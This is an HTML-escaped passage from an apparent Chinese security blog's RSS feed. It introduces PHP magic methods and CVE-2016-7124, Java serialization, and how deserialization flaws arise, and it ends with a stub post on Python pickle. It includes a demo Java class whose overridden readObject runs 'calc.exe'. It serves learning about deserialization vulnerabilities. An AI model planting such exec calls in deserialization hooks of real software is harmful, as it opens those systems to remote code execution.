data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                  //读取不可访问属性的值时，这里的不可访问包含私有属性或未定义&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__set&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                  //在给不可访问属性赋值时触发&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__isset&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                //当对不可访问属性调用 isset&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 或 empty&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; 时触发&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__unset&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                //在不可访问的属性上使用unset&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;时触发&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__invoke&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;               //当尝试以调用函数的方式调用一个对象时触发&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                //执行serialize&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;时，先会调用这个方法&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__wakeup&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;               //执行unserialize&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;时，先会调用这个方法&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__toString&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;             //当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;serialize () 函数会检查类中是否存在一个魔术方法。如果存在，该方法会先被调用，然后才执行序列化操作。&lt;/p&gt;
&lt;p&gt;从序列化到反序列化这几个函数的执行过程是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__construct()` -&amp;gt;`__sleep()` -&amp;gt; `__wakeup()` -&amp;gt; `__toString()` -&amp;gt; `__destruct()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;_sleep&lt;/code&gt;  方法在一个对象被序列化时调用， &lt;code&gt;_wakeup&lt;/code&gt;  方法在一个对象被反序列化时调用&lt;/p&gt;
&lt;p&gt;__tostring () 触发时机：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;.  echo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$obj&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;/print&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$obj&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;打印时会触发 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;.  反序列化对象与字符串连接时 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;.  反序列化对象参与格式化字符串时 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;.  反序列化对象与字符串进行&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;比较时（PHP进行&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;比较的时候会转换参数类型） &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;.  反序列化对象参与格式化SQL语句，绑定参数时 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;.  反序列化对象在经过php字符串处理函数，如strlen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;、strops&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;、strcmp&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;、addslashes&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;等 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;.  在in_array&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;方法中，第一个参数时反序列化对象，第二个参数的数组中有__toString&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;返回的字符串的时候__toString&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;会被调用 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;.  反序列化的对象作为class_exists&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;的参数的时候&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;PHP 序列化需注意以下几点：&lt;/p&gt;
&lt;p&gt;1、序列化只序列属性，不序列方法 2、因为序列化不序列方法，所以反序列化之后如果想正常使用这个对象的话我们必须要依托这个类要在当前作用域存在的条件 3、我们能控制的只有类的属性，攻击就是寻找合适能被控制的属性，利用作用域本身存在的方法，基于属性发动攻击&lt;/p&gt;
&lt;p&gt;4、PHP 对象是存放在&lt;strong&gt;内存的堆空间段&lt;/strong&gt;上的，PHP 文件在&lt;strong&gt;执行结束的时候会将对象销毁&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&#34;cve-2016-7124&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2016-7124&#34;&gt;#&lt;/a&gt; CVE-2016-7124&lt;/h3&gt;
&lt;p&gt;CVE-2016-7124：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行&lt;/p&gt;
&lt;h2 id=&#34;java反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java反序列化&#34;&gt;#&lt;/a&gt; java 反序列化&lt;/h2&gt;
&lt;p&gt;Java 中通常使用 &lt;code&gt;Java.io.ObjectOutputStream&lt;/code&gt;  类中的 &lt;code&gt;writeObject&lt;/code&gt;  方法进行序列化， &lt;code&gt;java.io.ObjectInputStream&lt;/code&gt;  类中的 &lt;code&gt;readObject&lt;/code&gt;  方法进行反序列化。使用下面代码将字符串进行序列化和反序列化：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package com.company;

import java.io.ObjectOutputStream;
import java.io.ObjectInputStream;
import java.io.FileOutputStream;
import java.io.FileInputStream;

public class Main&amp;#123;

    public static void main(String args[]) throws Exception &amp;#123;
        String obj = &amp;quot;hello&amp;quot;;

        // 将序列化后的数据写入文件a.ser中，当序列化一个对象到文件时， 按照 Java 的标准约定是给文件一个 .ser 扩展名
        FileOutputStream fos = new FileOutputStream(&amp;quot;a.ser&amp;quot;);
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(obj);
        os.close();

        // 从文件a.ser中读取数据
        FileInputStream fis = new FileInputStream(&amp;quot;a.ser&amp;quot;);
        ObjectInputStream ois = new ObjectInputStream(fis);

        // 通过反序列化恢复字符串
        String obj2 = (String)ois.readObject();
        System.out.println(obj2);
        ois.close();
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;程序执行后生成 a.ser 文件&lt;/p&gt;
&lt;p&gt;以十六进制查看 a.ser 文件内容，如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/image-20240508003638454.png&#34; alt=&#34;image-20240508003638454&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ac ed 00 05&lt;/code&gt;  是 java 序列化内容的特征，如果经过 base64 编码，那么相对应的是 &lt;code&gt;rO0AB&lt;/code&gt; ：&lt;/p&gt;
&lt;p&gt;一个 Java 类的对象要想序列化成功，必须满足两个条件：&lt;/p&gt;
&lt;p&gt;1. 该类必须实现 &lt;code&gt;java.io.Serializable&lt;/code&gt;  接口。&lt;/p&gt;
&lt;p&gt;2. 该类的所有属性必须是可序列化的，如果有一个属性不是可序列化的，则该属性必须注明是短暂的。&lt;/p&gt;
&lt;h2 id=&#34;java反序列化漏洞成因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java反序列化漏洞成因&#34;&gt;#&lt;/a&gt; &lt;strong&gt;java 反序列化漏洞成因&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;暴露或间接暴露反序列化 API ，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码&lt;/p&gt;
&lt;p&gt;反序列化时会调用 readObject () 函数，如果重写了 readObject 函数，并且里面含有恶意代码，那么在反序列化时调用这个函数就会直接执行恶意代码。&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;import&lt;/span&gt; java.io.*&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;class MyObject implements Serializable&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    public String name&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    //重写readObject&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;方法&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    private void readObject&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;java.io.ObjectInputStream &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; throws IOException, ClassNotFoundException, IOException &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        //执行默认的readObject&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;方法&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        in.defaultReadObject&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        //执行打开计算器程序命令&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        Runtime.getRuntime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;.exec&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;calc.exe&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;public class testSerialize &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    public static void main&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;String args&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; throws Exception&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        //定义myObj对象&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        MyObject myObj &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new MyObject&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        myObj.name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;hi&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        //创建一个包含对象进行反序列化信息的”object”数据文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        FileOutputStream fos &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new FileOutputStream&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;object&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        ObjectOutputStream os &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new ObjectOutputStream&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fos&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        //writeObject&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;方法将myObj对象写入object文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        os.writeObject&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;myObj&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        os.close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        //从文件中反序列化obj对象&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        FileInputStream fis &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new FileInputStream&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;object&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        ObjectInputStream ois &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new ObjectInputStream&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fis&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        //恢复对象&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        MyObject objectFromDisk &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;MyObject&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;ois.readObject&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        System.out.println&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;objectFromDisk.name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        ois.close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;这里定义了一个 Myobject 类并继承了 Serializable 接口，并且重写了 readObject 方法。在反序列化时会执行 readObject 方法。在 readObject () 方法中写入了 Runtime.getRuntime ().exec (“calc.exe”)，在反序列化时就会执行相应的命令。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这么看起来原理挺简单的，不过实际上就没有这种运气了，都得靠自己构造链子，不过这里先不探讨了，这里只是入个门…&lt;/p&gt;
&lt;p&gt;这篇打算来看看，用工具比较多：&lt;a href=&#34;https://blog.csdn.net/miuzzx/article/details/128221385&#34;&gt;CTFSHOW web 入门 java 反序列化篇（更新中）_ctfshow java 反序列化 - CSDN 博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Hardworking666/article/details/122373938&#34;&gt;PHP 反序列化漏洞详解（万字分析、由浅入深）_php 反序列化漏洞原理 - CSDN 博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/276624.html&#34;&gt;常见的 Web 漏洞 —— 反序列化漏洞 - FreeBuf 网络安全行业门户&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/367585.html&#34;&gt;java 反序列化漏洞详解 - FreeBuf 网络安全行业门户&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://demoyao100.github.io/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
            <title>pickle反序列化</title>
            <link>https://demoyao100.github.io/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
            <category>web</category>
            <pubDate>Mon, 18 Sep 2023 14:28:10 +0800</pubDate>
            <description><![CDATA[ &lt;h6 id=&#34;preface-就是看看~&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#preface-就是看看~&#34;&gt;#&lt;/a&gt; PREFACE: 就是看看～&lt;/h6&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;p&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/89132768&#34;&gt;从零开始 python 反序列化攻击：pickle 原理解析 &amp;amp; 不用 reduce 的 RCE 姿势 - 知乎 (zhihu.com)&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
